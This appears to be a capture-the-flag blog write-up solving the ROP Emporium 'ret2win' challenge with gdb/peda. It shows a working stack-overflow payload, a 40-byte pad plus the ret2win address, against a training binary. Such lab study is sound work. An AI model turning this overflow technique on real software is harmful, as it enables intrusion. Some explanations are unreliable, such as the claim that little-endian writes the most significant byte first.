<!--
title: Smooth ROPerator
date: 20210723
-->

I've recently been studying to complete my SANS GIAC Exploit Researcher and Advanced Penetration Tester (GXPN) certificate so I thought I might get a little bit of practice in looking for some progressive ROP chain challenges.

I stumbled upon the site [ropemporium](https://ropemporium.com/) which is basically exactly what I was looking for. For those of you unsure what a ROP chain is, ROP stands for Return Orientated Programming. It's basically a technique used to bypass protections against a binary which prevents execution of memory. The technical term for this protection is [Executable Space Protection](https://en.wikipedia.org/wiki/Executable_space_protection). It is one of many techniques required to learn when writing exploits and it's pretty fun when you get the hang of it.

The basic idea behind ROP is if you have an executable that you can overflow using user input, but it has Non-eXecutable Stack Protection (NX) , then you can use a ROP chain. Why you ask? Well because if you are able to write to memory, but not execute, then maybe you can overwrite a memory address in the stack, which already has permission to execute. To do this, we utilise libraries, which are usually available in standard operating systems. As these libraries are loaded as dependencies at runtime we can grab certain functions from them and provide arguments using the memory we can write. It's all a bit confusing if you have never seen it in action, but hopefully this post gives you some inspiration and motivation to work on it yourself.

### DON'T DEAD; OPEN INSIDE

Just a word of caution. When doing these exercises it's always a good idea to create a new virtual machine for your playground. Afterall, you're downloading random binaries off the Internet and executing them. It's usually a good idea to at least keep that off your normal system. For this post, i'm using a plain Debian build, so feel free to copy and paste the apt-get commands.

### tools

You'll require a few tools before you begin, but we'll use minimal tooling for this exercise. Install instructions will follow.
* Debugger - On Linux this is probably going to be GDB, I'd also suggest using a plugin like [peda](https://github.com/longld/peda)
* checksec - This is used to identify the protections used on the binary

To install these on Debian simply run the following commands:
```
$ sudo apt-get update
$ sudo apt-get install gdb git checksec
$ git clone https://github.com/longld/peda.git ~/peda
$ echo "source ~/peda/peda.py" >> ~/.gdbinit
```

### check the protections

Jump on over to ropemporium and download the first challenge. This is called ret2win. For this post we're using the x86_64 binary.

Let's have a look at what protections ret2win uses:
```
$ checksec --file ./ret2win
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols	No	0		6	./ret2win
```
It's always a good idea to have a look at this, even though we're doing ROP chain exercises (all binaries will probably have NX enabled), just as practice for when you're going into something blind.

### any juicy functions?

Let's have a look at what functions there are within the program:
```
gdb ./ret2win
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme                    <-- is this juicy?
0x0000000000400756  ret2win                  <-- or maybe this?
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
```

There are 2 functions that look interesting here 'pwnme' and 'ret2win'. Let's take a closer look at these.

We can disassemble 'pwnme' by running the following command.
```
gdb-peda$ disassemble pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400838
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x400898
   0x0000000000400715 <+45>:	call   0x400550 <puts@plt>
   0x000000000040071a <+50>:	mov    edi,0x4008b8
   0x000000000040071f <+55>:	call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:	mov    edi,0x400918
   0x0000000000400729 <+65>:	mov    eax,0x0
   0x000000000040072e <+70>:	call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:	lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:	mov    edx,0x38
   0x000000000040073c <+84>:	mov    rsi,rax
   0x000000000040073f <+87>:	mov    edi,0x0
   0x0000000000400744 <+92>:	call   0x400590 <read@plt>
   0x0000000000400749 <+97>:	mov    edi,0x40091b
   0x000000000040074e <+102>:	call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:	nop
   0x0000000000400754 <+108>:	leave  
   0x0000000000400755 <+109>:	ret    
End of assembler dump.
```

There are a few 'puts' commands, a printf, what are they outputting? We can read those memory addresses by running 'x/s' followed by the address.
* x = eXamine
* s = string
```
gdb-peda$ x/s 0x400838
0x400838:	"For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!"
gdb-peda$ x/s 0x400898
0x400898:	"What could possibly go wrong?"
gdb-peda$ x/s 0x4008b8
0x4008b8:	"You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
```
It looks like this is just standard string used by the start up of the program. Nothing really of use here. Let's have a look at 'ret2win'.
```
gdb-peda$ disassemble ret2win 
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:	push   rbp
   0x0000000000400757 <+1>:	mov    rbp,rsp
   0x000000000040075a <+4>:	mov    edi,0x400926
   0x000000000040075f <+9>:	call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:	mov    edi,0x400943
   0x0000000000400769 <+19>:	call   0x400560 <system@plt>
   0x000000000040076e <+24>:	nop
   0x000000000040076f <+25>:	pop    rbp
   0x0000000000400770 <+26>:	ret    
End of assembler dump.
```

Looks like it also calls puts, but wait a second, it's calling 'system' this is very interesting function. We can have a look at what system does by running 'man system' in another terminal.

```
$ man system

SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);

The system() library function uses fork(2) to create a child process that executes the shell command specified in command using execl(3) as follows:
```

Okay so this basically gives us command execution, all it requires is you pass it 1 argument which contains your command. We can verify this from the disassembled function. I've copied it below to make it easier to read:
```
   0x0000000000400764 <+14>:	mov    edi,0x400943          <-- Move into edi, whatever is in 0x400943
   0x0000000000400769 <+19>:	call   0x400560 <system@plt> <-- Execute system()
```

Let's take a look at what is in that memory address, using eXamine like we did before:
```
gdb-peda$ x/s 0x400943
0x400943:	"/bin/cat flag.txt"
```
So basically this function calls system(/bin/cat flag.txt) which is exactly what we want to achieve. This means that we need to identify the address of this function and then figure out for the binary to divert to this address.

We can simply run the following inside gdb to find the address of the function:
```
gdb-peda$ info addr ret2win
Symbol "ret2win" is at 0x400756 in a file compiled without debugging.
```

Great now we know that the address for ret2win is at 0x400756. Okay now let's work out how to gain control of the execution flow. This program takes user input from stdin so, let's just chuck some data in there and see what happens. For this next part we'll just feed the program 100 A's using python. I've broken up the output of this next command to help understand it bit by bit:
```
gdb-peda$ run < <(python -c 'print("A"*100)')
Starting program: /home/user/Downloads/ropemporium/ret2win < <(python -c 'print("A"*100)')
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!

Program received signal SIGSEGV, Segmentation fault.
```

So, when we provided the program 100 A's it crashed the program. This is exactly what we want. That means, the data we provided, must have overwritten some address required on the stack. Let's take a look at the registers:

```
[----------------------------------registers-----------------------------------]
RAX: 0xb ('\x0b')
RBX: 0x0 
RCX: 0x7ffff7ee4504 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7fb78c0 --> 0x0 
RSI: 0x7ffff7fb67e3 --> 0xfb78c0000000000a 
RDI: 0x0 
RBP: 0x4141414141414141 ('AAAAAAAA')              <--- our "A"s
RSP: 0x7fffffffe138 ('A' <repeats 16 times>, "\233\340\341\367\377\177") <--- more of our "A"s
RIP: 0x400755 (<pwnme+109>:	ret)
R8 : 0x7ffff7fbc500 (0x00007ffff7fbc500)
R9 : 0x7ffff7fbc500 (0x00007ffff7fbc500)
R10: 0xfffffffffffff40e 
R11: 0x246 
R12: 0x4005b0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe220 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
```

It looks like our data has overwritten the RBP (Base Pointer) and the RSP (Stack Pointer), but not the RIP (Instruction Pointer). This means we should be able to take control of execution by controlling the RSP. Let's see if we can more accurately guess where in the data we provided this address would be. To do this we can create a pattern of data then execute the program using that pattern. When the program crashes again, we can check what the RSP is, and cross reference it, with the pattern to identify the offset. Luckily we can use Peda to do most of the work for us:

1. create the pattern
```
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

2. run the program using the pattern
```
gdb-peda$ run < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")')
Starting program: /home/user/Downloads/ropemporium/ret2win < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")')
ret2win by ROP Emporium
x86_64

<REDUCED FOR BREVITY>
[----------------------------------registers-----------------------------------]
RAX: 0xb ('\x0b')
RBX: 0x0 
RCX: 0x7ffff7ee4504 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7fb78c0 --> 0x0 
RSI: 0x7ffff7fb67e3 --> 0xfb78c0000000000a 
RDI: 0x0 
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe138 ("AA0AAFAAbAA1AAGA\233\340\341\367\377\177")   <-- Our pattern overwrote RDP with AA0AAFAAbAA1AAGA
RIP: 0x400755 (<pwnme+109>:	ret)
R8 : 0x7ffff7fbc500 (0x00007ffff7fbc500)
R9 : 0x7ffff7fbc500 (0x00007ffff7fbc500)
R10: 0xfffffffffffff40e 
R11: 0x246 
R12: 0x4005b0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe220 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
```

3. check the offset of the pattern using pattern_offset
```
gdb-peda$ pattern_offset AA0AAFAAbAA1AAGA
AA0AAFAAbAA1AAGA found at offset: 40
```

pattern_offset identified that the offset was 40 bytes, this means we should be able to control the RSP by providing 40 bytes + 8 bytes for the address of RSP. Let's double check this is correct by using python:

```
gdb-peda$ run < <(python -c 'print("A"*40 + "B"*8)')

<REDUCED FOR BREVITY>
[----------------------------------registers-----------------------------------]
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffe138 ("BBBBBBBB\n\a@")      <-- We can see that all 8 bytes have overwritten RSP
RIP: 0x400755 (<pwnme+109>:	ret)
```

Now we'll grab the memory address for ret2win, and replace the B's with that. Don't forget we'll be using little-endian, so we'll be writing it with the most significant byte first.

```
gdb-peda$ info addr ret2win
Symbol "ret2win" is at 0x400756 in a file compiled without debugging.

gdb-peda$ run < <(python -c 'print("A" * 40 + "\x56\x07\x40\x00\x00\x00\x00\x00")')
Starting program: /home/user/Downloads/ropemporium/ret2win < <(python -c 'print("A" * 40 + "\x56\x07\x40\x00\x00\x00\x00\x00")')
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
[Attaching after process 3046 fork to child process 3049]
[New inferior 2 (process 3049)]
[Detaching after fork from parent process 3046]
[Inferior 1 (process 3046) detached]
process 3049 is executing new program: /usr/bin/dash
[Attaching after process 3049 fork to child process 3050]
[New inferior 3 (process 3050)]
[Detaching after fork from parent process 3049]
[Inferior 2 (process 3049) detached]
process 3050 is executing new program: /usr/bin/cat
ROPE{a_placeholder_32byte_flag!}                         <-- We did it!
```

Let's just double check this all works outside of the debugger. Copy and paste your python line, exit the GDB, then pipe the python command to the binary:

```
$ python -c 'print("A" * 40 + "\x56\x07\x40\x00\x00\x00\x00\x00")' | ./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

Awesome, so we completed our first of many ROP chains. I hope this has helped you on your journey, and given you a bit little bit of motivation to learn more.

-Jeremy

